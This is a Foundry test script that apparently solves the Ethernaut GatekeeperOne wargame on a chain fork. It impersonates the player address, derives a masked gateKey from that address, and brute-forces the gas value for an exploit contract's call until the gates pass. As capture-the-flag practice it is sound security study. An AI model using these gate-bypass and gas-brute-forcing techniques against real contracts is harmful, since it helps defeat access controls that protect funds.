// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/GatekeeperOneHack.sol";

contract GatekeeperForkTest is Test {
    GatekeeperOneHack public gatekeeperOneHack;

    address public constant GATEKEEPERONE_ADDRESS = 0x1483Ed9FDA159E2552CdDFA11c97F2c59DaB4784;
    address public constant OWN_ADDRESS = 0x2f8E710cA34bF3d74Bd7C4F78e501Ab0014c85F3;

    function setUp() public {
        gatekeeperOneHack = new GatekeeperOneHack();
    }

    function testForkAttack() public {
        // 1. Force Foundry to masquerade as your real player address
        // This ensures tx.origin == OWN_ADDRESS inside the execution bracket
        vm.startPrank(OWN_ADDRESS, OWN_ADDRESS);

        // 2. Generate the perfect gateKey mask tailored to YOUR player address
        // forge-lint: disable-next-line(unsafe-typecast)
        bytes8 gateKey = bytes8(uint64(uint160(OWN_ADDRESS))) & 0xFFFFFFFF0000FFFF;

        // 3. Define the gas search window
        // 8191 * 3 is roughly 24,573. We start around 50k to ensure there's enough
        // baseline gas to run the opcodes leading up to the gasleft() check.
        uint256 baseGas = 50000;
        bool solved = false;

        console.log("Searching for the magic gas value on fork...");

        for (uint256 i = 0; i < 8192; i++) {
            uint256 gasTest = baseGas + i;

            // We call our exploit contract via a low-level call so a failure (revert)
            // inside the loop doesn't crash the Forge test execution.
            (bool success, bytes memory data) = address(gatekeeperOneHack)
                .call(
                    abi.encodeWithSignature(
                        "hackGatekeeperOne(address,bytes8,uint256)", GATEKEEPERONE_ADDRESS, gateKey, gasTest
                    )
                );

            // If the exploit returned true, we successfully registered!
            if (success && abi.decode(data, (bool))) {
                console.log("-------------------------------------------------");
                console.log("SUCCESS! Magic gas value discovered:", gasTest);
                console.log("-------------------------------------------------");
                solved = true;
                break;
            }
        }

        vm.stopPrank();

        require(solved, "Brute force range exhausted. Try increasing baseGas.");
    }
}
